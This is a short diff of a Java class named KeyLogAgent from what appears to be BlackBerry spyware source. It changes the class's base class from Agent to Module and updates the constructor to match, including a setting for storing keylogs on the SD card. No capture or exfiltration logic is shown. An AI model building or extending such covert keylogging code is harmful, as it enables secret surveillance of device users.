@@ -17,7 +17,7 @@ import blackberry.debug.DebugLevel;
 /**
  * The Class KeyLogAgent.
  */
-public final class KeyLogAgent extends Agent {
+public final class KeyLogAgent extends Module {
     //#ifdef DEBUG
     static Debug debug = new Debug("KeyLogAgent", DebugLevel.VERBOSE);
     //#endif
@@ -29,7 +29,7 @@ public final class KeyLogAgent extends Agent {
      *            the agent status
      */
     public KeyLogAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_KEYLOG, agentEnabled, Conf.AGENT_KEYLOG_ON_SD, "KeyLogAgent");
+        super(Module.AGENT_KEYLOG, agentEnabled, Conf.AGENT_KEYLOG_ON_SD, "KeyLogAgent");
 
     }
 
